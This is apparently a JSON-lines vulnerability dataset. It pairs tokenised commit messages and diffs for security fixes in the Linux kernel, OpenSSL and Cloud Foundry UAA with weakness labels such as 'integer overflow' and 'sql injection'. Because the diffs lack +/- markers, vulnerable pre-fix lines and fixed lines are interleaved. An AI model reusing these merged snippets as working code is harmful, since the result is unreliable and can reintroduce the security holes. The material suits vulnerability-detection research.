{"contents": ["IB/rxe:", "Fix", "mem_check_range", "integer", "overflow", "Update", "the", "range", "check", "to", "avoid", "integer-overflow", "in", "edge", "case.", "Resolves", "CVE", "2016-8636.", "Signed-off-by:", "Eyal", "Itkin", "<eyal.itkin@gmail.com>", "Signed-off-by:", "Dan", "Carpenter", "<dan.carpenter@oracle.com>", "Reviewed-by:", "Leon", "Romanovsky", "<leonro@mellanox.com>", "Signed-off-by:", "Doug", "Ledford", "<dledford@redhat.com>"], "code_tokens": ["@", "@", "-", "59", ",", "9", "+", "59", ",", "11", "@", "@", "int", "mem_check_range", "(", "struct", "rxe_mem", "*", "mem", ",", "u64", "iova", ",", "size_t", "length", ")", "case", "RXE_MEM_TYPE_MR", ":", "case", "RXE_MEM_TYPE_FMR", ":", "return", "(", "(", "iova", "<", "mem", "-", ">", "iova", ")", "|", "|", "(", "(", "iova", "+", "length", ")", ">", "(", "mem", "-", ">", "iova", "+", "mem", "-", ">", "length", ")", "))", "?", "-", "EFAULT", ":", "0", ";", "if", "(", "iova", "<", "mem", "-", ">", "iova", "|", "|", "length", ">", "mem", "-", ">", "length", "|", "|", "iova", ">", "mem", "-", ">", "iova", "+", "mem", "-", ">", "length", "-", "length", ")", "return", "-", "EFAULT", ";", "return", "0", ";", "default", ":", "return", "-", "EFAULT", ";"], "docstring_tokens": ["integer", "overflow"]}
{"contents": ["Keep", "old", "method", "in", "case", "of", "an", "unsupported", "protocol", "When", "we're", "configured", "with", "no-ssl3", "and", "we", "receive", "an", "SSL", "v3", "Client", "Hello,", "we", "set", "the", "method", "to", "NULL.", "We", "didn't", "used", "to", "do", "that,", "and", "it", "breaks", "things.", "This", "is", "a", "regression", "introduced", "in", "62f45cc27d07187b59551e4fad3db4e52ea73f2c.", "Keep", "the", "old", "method", "since", "the", "code", "is", "not", "able", "to", "deal", "with", "a", "NULL", "method", "at", "this", "time.", ",", "PR#3571", "Reviewed-by:", "Emilia", "K\u00e4sper", "<emilia@openssl.org>"], "code_tokens": ["@", "@", "-", "615", ",", "12", "+", "615", ",", "14", "@", "@", "int", "ssl23_get_client_hello", "(", "SSL", "*", "s", ")", "if", "(", "(", "type", "=", "=", "2", ")", "|", "|", "(", "type", "=", "=", "3", ")", ")", "{", "/", "*", "we", "have", "SSLv3", "/", "TLSv1", "(", "type", "2", ":", "SSL2", "style", ",", "type", "3", ":", "SSL3", "/", "TLS", "style", ")", "*", "/", "s", "-", ">", "method", "=", "ssl23_get_server_method", "(", "s", "-", ">", "version", ")", ";", "if", "(", "s", "-", ">", "method", "=", "=", "NULL", ")", "const", "SSL_METHOD", "*", "new_method", ";", "new_method", "=", "ssl23_get_server_method", "(", "s", "-", ">", "version", ")", ";", "if", "(", "new_method", "=", "=", "NULL", ")", "{", "SSLerr", "(", "SSL_F_SSL23_GET_CLIENT_HELLO", ",", "SSL_R_UNSUPPORTED_PROTOCOL", ")", ";", "goto", "err", ";", "}", "s", "-", ">", "method", "=", "new_method", ";", "if", "(", "!", "ssl_init_wbio_buffer", "(", "s", ",", "1", ")", ")", "goto", "err", ";"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["ALSA:", "seq:", "Fix", "missing", "NULL", "check", "at", "remove_events", "ioctl", "snd_seq_ioctl_remove_events()", "calls", "snd_seq_fifo_clear()", "unconditionally", "even", "if", "there", "is", "no", "FIFO", "assigned,", "and", "this", "leads", "to", "an", "Oops", "due", "to", "NULL", "dereference.", "The", "fix", "is", "just", "to", "add", "a", "proper", "NULL", "check.", "Reported-by:", "Dmitry", "Vyukov", "<dvyukov@google.com>", "Tested-by:", "Dmitry", "Vyukov", "<dvyukov@google.com>", "Cc:", "<stable@vger.kernel.org>", "Signed-off-by:", "Takashi", "Iwai", "<tiwai@suse.de>"], "code_tokens": ["@", "@", "-", "1962", ",", "7", "+", "1962", ",", "7", "@", "@", "static", "int", "snd_seq_ioctl_remove_events", "(", "struct", "snd_seq_client", "*", "client", ",", "*", "No", "restrictions", "so", "for", "a", "user", "client", "we", "can", "clear", "*", "the", "whole", "fifo", "*", "/", "if", "(", "client", "-", ">", "type", "=", "=", "USER_CLIENT", ")", "if", "(", "client", "-", ">", "type", "=", "=", "USER_CLIENT", "&", "&", "client", "-", ">", "data", ".", "user", ".", "fifo", ")", "snd_seq_fifo_clear", "(", "client", "-", ">", "data", ".", "user", ".", "fifo", ")", ";", "}"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["[media]", "dvb-usb-v2:", "avoid", "use-after-free", "I", "ran", "into", "a", "stack", "frame", "size", "warning", "because", "of", "the", "on-stack", "copy", "of", "the", "USB", "device", "structure:", "drivers/media/usb/dvb-usb-v2/dvb_usb_core.c:", "In", "function", "'dvb_usbv2_disconnect':", "drivers/media/usb/dvb-usb-v2/dvb_usb_core.c:1029:1:", "error:", "the", "frame", "size", "of", "1104", "bytes", "is", "larger", "than", "1024", "bytes", "[-Werror=frame-larger-than=]", "Copying", "a", "device", "structure", "like", "this", "is", "wrong", "for", "a", "number", "of", "other", "reasons", "too", "aside", "from", "the", "possible", "stack", "overflow.", "One", "of", "them", "is", "that", "the", "dev_info()", "call", "will", "print", "the", "name", "of", "the", "device", "later,", "but", "AFAICT", "we", "have", "only", "copied", "a", "pointer", "to", "the", "name", "earlier", "and", "the", "actual", "name", "has", "been", "freed", "by", "the", "time", "it", "gets", "printed.", "This", "removes", "the", "on-stack", "copy", "of", "the", "device", "and", "instead", "copies", "the", "device", "name", "using", "kstrdup().", "I'm", "ignoring", "the", "possible", "failure", "here", "as", "both", "printk()", "and", "kfree()", "are", "able", "to", "deal", "with", "NULL", "pointers.", "Signed-off-by:", "Arnd", "Bergmann", "<arnd@arndb.de>", "Signed-off-by:", "Mauro", "Carvalho", "Chehab", "<mchehab@s-opensource.com>"], "code_tokens": ["@", "@", "-", "1012", ",", "8", "+", "1012", ",", "8", "@", "@", "EXPORT_SYMBOL", "(", "dvb_usbv2_probe", ")", ";", "void", "dvb_usbv2_disconnect", "(", "struct", "usb_interface", "*", "intf", ")", "{", "struct", "dvb_usb_device", "*", "d", "=", "usb_get_intfdata", "(", "intf", ")", ";", "const", "char", "*", "name", "=", "d", "-", ">", "name", ";", "struct", "device", "dev", "=", "d", "-", ">", "udev", "-", ">", "dev", ";", "const", "char", "*", "devname", "=", "kstrdup", "(", "dev_name", "(", "&", "d", "-", ">", "udev", "-", ">", "dev", ")", ",", "GFP_KERNEL", ")", ";", "const", "char", "*", "drvname", "=", "d", "-", ">", "name", ";", "dev_dbg", "(", "&", "d", "-", ">", "udev", "-", ">", "dev", ",", "\"", "%", "s", ":", "bInterfaceNumber", "=", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "intf", "-", ">", "cur_altsetting", "-", ">", "desc", ".", "bInterfaceNumber", ")", ";", "@", "@", "-", "1023", ",", "8", "+", "1023", ",", "9", "@", "@", "void", "dvb_usbv2_disconnect", "(", "struct", "usb_interface", "*", "intf", ")", "dvb_usbv2_exit", "(", "d", ")", ";", "dev_info", "(", "&", "dev", ",", "\"", "%", "s", ":", "'", "%", "s", "'", "successfully", "deinitialized", "and", "disconnected", "\\", "n", "\"", ",", "KBUILD_MODNAME", ",", "name", ")", ";", "pr_info", "(", "\"%", "s", ":", "'", "%", "s", ":", "%", "s", "'", "successfully", "deinitialized", "and", "disconnected", "\\", "n", "\"", ",", "KBUILD_MODNAME", ",", "drvname", ",", "devname", ")", ";", "kfree", "(", "devname", ")", ";", "}", "EXPORT_SYMBOL", "(", "dvb_usbv2_disconnect", ")", ";"], "docstring_tokens": ["memory", "corruption"]}
{"contents": ["Validate", "client", "ID", "for", "approvals", "[#143844261]", "https://www.pivotaltracker.com/story/show/143844261"], "code_tokens": ["@", "@", "-", "12", ",", "21", "+", "12", ",", "27", "@", "@", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "package", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "account", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "authentication", ".", "UaaPrincipal", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "Approval", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "ApprovalsService", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "DescribedApproval", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "oauth", ".", "client", ".", "ClientConstants", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "authentication", ".", "UaaPrincipal", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "constants", ".", "OriginKeys", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "Approval", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "oauth", ".", "client", ".", "ClientConstants", ";", "import", "org", ".", "springframework", ".", "beans", ".", "factory", ".", "annotation", ".", "Autowired", ";", "import", "org", ".", "springframework", ".", "security", ".", "core", ".", "Authentication", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "ClientDetails", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "ClientDetailsService", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "NoSuchClientException", ";", "import", "org", ".", "springframework", ".", "stereotype", ".", "Controller", ";", "import", "org", ".", "springframework", ".", "ui", ".", "Model", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "ExceptionHandler", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "RequestMapping", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "RequestMethod", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "RequestParam", ";", "import", "org", ".", "springframework", ".", "web", ".", "servlet", ".", "View", ";", "import", "org", ".", "springframework", ".", "web", ".", "servlet", ".", "view", ".", "RedirectView", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Collection", ";", "@", "@", "-", "37", ",", "6", "+", "43", ",", "8", "@", "@", "@", "Controller", "public", "class", "ProfileController", "{", "protected", "static", "Log", "logger", "=", "LogFactory", ".", "getLog", "(", "ProfileController", ".", "class", ")", ";", "private", "final", "ApprovalsService", "approvalsService", ";", "private", "final", "ClientDetailsService", "clientDetailsService", ";", "@", "@", "-", "108", ",", "6", "+", "116", ",", "13", "@", "@", "else", "if", "(", "null", "!", "=", "delete", ")", "{", "return", "\"", "redirect", ":", "profile", "\"", ";", "}", "@", "ExceptionHandler", "public", "View", "handleException", "(", "NoSuchClientException", "nsce", ")", "{", "logger", ".", "debug", "(", "\"", "Unable", "to", "find", "client", "for", "approvals", ":", "\"+", "nsce", ".", "getMessage", "(", "))", ";", "return", "new", "RedirectView", "(", "\"", "profile", "?", "error_message_code", "=", "request", ".", "invalid_parameter", "\"", ",", "true", ")", ";", "}", "private", "boolean", "isUaaManagedUser", "(", "Authentication", "authentication", ")", "{", "if", "(", "authentication", ".", "getPrincipal", "(", ")", "instanceof", "UaaPrincipal", ")", "{", "UaaPrincipal", "principal", "=", "(", "UaaPrincipal", ")", "authentication", ".", "getPrincipal", "(", ");", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "Cloud", "Foundry", "*", "Cloud", "Foundry", "*", "Copyright", "(", "c", ")", "[", "2009", "-", "2016", "]", "Pivotal", "Software", ",", "Inc", ".", "All", "Rights", "Reserved", ".", "*", "*", "This", "product", "is", "licensed", "to", "you", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ").", "@", "@", "-", "12", ",", "41", "+", "12", ",", "45", "@", "@", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "package", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "oauth", ".", "client", ".", "ClientConstants", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "web", ".", "ConvertingExceptionView", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "web", ".", "ExceptionReport", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "error", ".", "UaaException", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "resources", ".", "ActionResult", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "security", ".", "DefaultSecurityContextAccessor", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "security", ".", "SecurityContextAccessor", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "user", ".", "UaaUserDatabase", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "util", ".", "UaaPagingUtils", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "web", ".", "ConvertingExceptionView", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "web", ".", "ExceptionReport", ";", "import", "org", ".", "springframework", ".", "beans", ".", "factory", ".", "InitializingBean", ";", "import", "org", ".", "springframework", ".", "http", ".", "HttpStatus", ";", "import", "org", ".", "springframework", ".", "http", ".", "ResponseEntity", ";", "import", "org", ".", "springframework", ".", "http", ".", "converter", ".", "HttpMessageConverter", ";", "import", "org", ".", "springframework", ".", "security", ".", "access", ".", "AccessDeniedException", ";", "import", "org", ".", "springframework", ".", "security", ".", "core", ".", "userdetails", ".", "UsernameNotFoundException", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "ClientDetails", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "ClientDetailsService", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "NoSuchClientException", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "client", ".", "BaseClientDetails", ";", "import", "org", ".", "springframework", ".", "stereotype", ".", "Controller", ";", "import", "org", ".", "springframework", ".", "util", ".", "Assert", ";", "import", "org", ".", "springframework", ".", "util", ".", "StringUtils", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "*;", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "ExceptionHandler", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "PathVariable", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "RequestBody", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "RequestMapping", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "RequestMethod", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "RequestParam", ";", "import", "org", ".", "springframework", ".", "web", ".", "bind", ".", "annotation", ".", "ResponseBody", ";", "import", "org", ".", "springframework", ".", "web", ".", "client", ".", "RestTemplate", ";", "import", "org", ".", "springframework", ".", "web", ".", "servlet", ".", "View", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Set", ";", "@", "Controller", "public", "class", "ApprovalsAdminEndpoints", "implements", "InitializingBean", ",", "ApprovalsControllerService", "{", "@", "@", "-", "168", ",", "6", "+", "172", ",", "7", "@", "@", "private", "String", "getCurrentUserId", "(", ")", "{", "@", "ResponseBody", "@", "Override", "public", "List", "<", "Approval", ">", "updateClientApprovals", "(", "@", "PathVariable", "String", "clientId", ",", "@", "RequestBody", "Approval", "[", "]", "approvals", ")", "{", "clientDetailsService", ".", "loadClientByClientId", "(", "clientId", ")", ";", "String", "currentUserId", "=", "getCurrentUserId", "(", ");", "logger", ".", "debug", "(", "\"", "Updating", "approvals", "for", "user", ":", "\"", "+", "currentUserId", ")", ";", "approvalStore", ".", "revokeApprovals", "(", "String", ".", "format", "(", "USER_AND_CLIENT_FILTER_TEMPLATE", ",", "currentUserId", ",", "clientId", ")", ");", "@", "@", "-", "202", ",", "10", "+", "207", ",", "17", "@", "@", "private", "boolean", "isValidUser", "(", "String", "userId", ")", "{", "public", "ActionResult", "revokeApprovals", "(", "@", "RequestParam", "(", "required", "=", "true", ")", "String", "clientId", ")", "{", "String", "username", "=", "getCurrentUserId", "(", ");", "logger", ".", "debug", "(", "\"", "Revoking", "all", "existing", "approvals", "for", "user", ":", "\"", "+", "username", "+", "\"", "and", "client", "\"", "+", "clientId", ")", ";", "clientDetailsService", ".", "loadClientByClientId", "(", "clientId", ")", ";", "approvalStore", ".", "revokeApprovals", "(", "String", ".", "format", "(", "USER_AND_CLIENT_FILTER_TEMPLATE", ",", "username", ",", "clientId", ")", ");", "return", "new", "ActionResult", "(", "\"", "ok", "\"", ",", "\"", "Approvals", "of", "user", "\"", "+", "username", "+", "\"", "and", "client", "\"", "+", "clientId", "+", "\"", "revoked", "\"", ");", "}", "@", "ExceptionHandler", "public", "View", "handleException", "(", "NoSuchClientException", "nsce", ")", "{", "logger", ".", "debug", "(", "\"", "Client", "not", "found", ":", "\"+", "nsce", ".", "getMessage", "(", "))", ";", "return", "handleException", "(", "new", "UaaException", "(", "nsce", ".", "getMessage", "(", "),", "404", ")", ");", "}", "@", "ExceptionHandler", "public", "View", "handleException", "(", "Exception", "t", ")", "{", "UaaException", "e", "=", "t", "instanceof", "UaaException", "?", "(", "UaaException", ")", "t", ":", "new", "UaaException", "(", "\"", "Unexpected", "error", "\"", ",", "@", "@", "-", "1", ",", "5", "+", "1", ",", "5", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "Cloud", "Foundry", "*", "Cloud", "Foundry", "*", "Copyright", "(", "c", ")", "[", "2009", "-", "2016", "]", "Pivotal", "Software", ",", "Inc", ".", "All", "Rights", "Reserved", ".", "*", "*", "This", "product", "is", "licensed", "to", "you", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ").", "@", "@", "-", "12", ",", "30", "+", "12", ",", "12", "@", "@", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "package", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "oauth", ".", "approval", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "Date", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "static", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "Approval", ".", "ApprovalStatus", ".", "APPROVED", ";", "import", "static", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "Approval", ".", "ApprovalStatus", ".", "DENIED", ";", "import", "static", "org", ".", "hamcrest", ".", "MatcherAssert", ".", "assertThat", ";", "import", "static", "org", ".", "hamcrest", ".", "core", ".", "Is", ".", "is", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "mock", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "when", ";", "import", "com", ".", "fasterxml", ".", "jackson", ".", "core", ".", "type", ".", "TypeReference", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "Approval", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "Approval", ".", "ApprovalStatus", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "ApprovalsAdminEndpoints", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "JdbcApprovalStore", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "oauth", ".", "client", ".", "ClientConstants", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "error", ".", "UaaException", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "Approval", ".", "ApprovalStatus", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "resources", ".", "jdbc", ".", "JdbcPagingListFactory", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "resources", ".", "jdbc", ".", "SimpleSearchQueryConverter", ";", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "security", ".", "SecurityContextAccessor", ";", "@", "@", "-", "48", ",", "14", "+", "30", ",", "34", "@", "@", "import", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "util", ".", "JsonUtils", ";", "import", "org", ".", "junit", ".", "After", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "rules", ".", "ExpectedException", ";", "import", "org", ".", "springframework", ".", "jdbc", ".", "core", ".", "JdbcTemplate", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "NoSuchClientException", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "client", ".", "BaseClientDetails", ";", "import", "org", ".", "springframework", ".", "security", ".", "oauth2", ".", "provider", ".", "client", ".", "InMemoryClientDetailsService", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "Date", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "static", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "Approval", ".", "ApprovalStatus", ".", "APPROVED", ";", "import", "static", "org", ".", "cloudfoundry", ".", "identity", ".", "uaa", ".", "approval", ".", "Approval", ".", "ApprovalStatus", ".", "DENIED", ";", "import", "static", "org", ".", "hamcrest", ".", "MatcherAssert", ".", "assertThat", ";", "import", "static", "org", ".", "hamcrest", ".", "core", ".", "Is", ".", "is", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "mock", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "when", ";", "public", "class", "ApprovalsAdminEndpointsTests", "extends", "JdbcTestBase", "{", "private", "UaaTestAccounts", "testAccounts", "=", "null", ";", "private", "JdbcApprovalStore", "dao", ";", "private", "UaaUserDatabase", "userDao", "=", "null", ";", "@", "@", "-", "64", ",", "6", "+", "66", ",", "9", "@", "@", "private", "ApprovalsAdminEndpoints", "endpoints", ";", "@", "Rule", "public", "ExpectedException", "exception", "=", "ExpectedException", ".", "none", "(", ");", "@", "Before", "public", "void", "initApprovalsAdminEndpointsTests", "(", ")", "{", "testAccounts", "=", "UaaTestAccounts", ".", "standard", "(", "null", ")", ";", "@", "@", "-", "114", ",", "6", "+", "119", ",", "21", "@", "@", "public", "void", "cleanupDataSource", "(", ")", "throws", "Exception", "{", "assertThat", "(", "jdbcTemplate", ".", "queryForObject", "(", "\"", "select", "count", "(", "*)", "from", "users", "\"", ",", "Integer", ".", "class", ")", ",", "is", "(", "0", ")", ");", "}", "@", "Test", "public", "void", "validate_client_id_on_revoke", "(", ")", "throws", "Exception", "{", "exception", ".", "expect", "(", "NoSuchClientException", ".", "class", ")", ";", "exception", ".", "expectMessage", "(", "\"", "No", "client", "with", "requested", "id", ":", "invalid_id", "\"", ");", "endpoints", ".", "revokeApprovals", "(", "\"", "invalid_id", "\"", ");", "}", "@", "Test", "public", "void", "validate_client_id_on_update", "(", ")", "throws", "Exception", "{", "exception", ".", "expect", "(", "NoSuchClientException", ".", "class", ")", ";", "exception", ".", "expectMessage", "(", "\"", "No", "client", "with", "requested", "id", ":", "invalid_id", "\"", ");", "endpoints", ".", "updateClientApprovals", "(", "\"", "invalid_id", "\"", ",", "new", "Approval", "[", "0", "]", ");", "}", "@", "Test", "public", "void", "canGetApprovals", "(", ")", "{", "addApproval", "(", "marissa", ".", "getId", "(", "),", "\"", "c1", "\"", ",", "\"", "uaa", ".", "user", "\"", ",", "6000", ",", "APPROVED", ")", ";", "@", "@", "-", "50", ",", "6", "+", "50", ",", "7", "@", "@", "import", "static", "org", ".", "springframework", ".", "test", ".", "web", ".", "servlet", ".", "request", ".", "MockMvcRequestBuilders", ".", "post", ";", "import", "static", "org", ".", "springframework", ".", "test", ".", "web", ".", "servlet", ".", "result", ".", "MockMvcResultHandlers", ".", "print", ";", "import", "static", "org", ".", "springframework", ".", "test", ".", "web", ".", "servlet", ".", "result", ".", "MockMvcResultMatchers", ".", "content", ";", "import", "static", "org", ".", "springframework", ".", "test", ".", "web", ".", "servlet", ".", "result", ".", "MockMvcResultMatchers", ".", "header", ";", "import", "static", "org", ".", "springframework", ".", "test", ".", "web", ".", "servlet", ".", "result", ".", "MockMvcResultMatchers", ".", "redirectedUrlPattern", ";", "import", "static", "org", ".", "springframework", ".", "test", ".", "web", ".", "servlet", ".", "result", ".", "MockMvcResultMatchers", ".", "status", ";", "@", "@", "-", "128", ",", "6", "+", "129", ",", "37", "@", "@", "public", "void", "test_oauth_authorize_without_csrf", "(", ")", "throws", "Exception", "{", ".", "andExpect", "(", "status", "(", ").", "isFound", "(", "))", ";", "/", "/", "approval", "page", "no", "longer", "showing", "up", "}", "@", "Test", "public", "void", "revoke", "(", ")", "throws", "Exception", "{", "test_oauth_authorize_without_csrf", "(", ");", "MockHttpSession", "session", "=", "getAuthenticatedSession", "(", "user1", ")", ";", "getMockMvc", "(", ").", "perform", "(", "post", "(", "\"/", "profile", "\"", ")", ".", "with", "(", "cookieCsrf", "(", "))", ".", "param", "(", "\"", "delete", "\"", ",\"", "true", "\"", ")", ".", "param", "(", "\"", "clientId", "\"", ",", "client1", ".", "getClientId", "(", "))", ".", "session", "(", "session", ")", ")", ".", "andExpect", "(", "status", "(", ").", "isFound", "(", "))", ".", "andExpect", "(", "header", "(", ").", "string", "(", "\"", "Location", "\"", ",", "\"", "profile", "\"", "))", ";", "}", "@", "Test", "public", "void", "revoke_invalid_client", "(", ")", "throws", "Exception", "{", "test_oauth_authorize_without_csrf", "(", ");", "MockHttpSession", "session", "=", "getAuthenticatedSession", "(", "user1", ")", ";", "getMockMvc", "(", ").", "perform", "(", "post", "(", "\"/", "profile", "\"", ")", ".", "with", "(", "cookieCsrf", "(", "))", ".", "param", "(", "\"", "delete", "\"", ",\"", "true", "\"", ")", ".", "param", "(", "\"", "clientId", "\"", ",", "\"", "invalid_id", "\"", ")", ".", "session", "(", "session", ")", ")", ".", "andExpect", "(", "status", "(", ").", "isFound", "(", "))", ".", "andExpect", "(", "header", "(", ").", "string", "(", "\"", "Location", "\"", ",", "\"", "profile", "?", "error_message_code", "=", "request", ".", "invalid_parameter", "\"", "))", ";", "}", "@", "Test", "public", "void", "test_get_approvals", "(", ")", "throws", "Exception", "{", "test_oauth_authorize_without_csrf", "(", ");"], "docstring_tokens": ["sql", "injection"]}
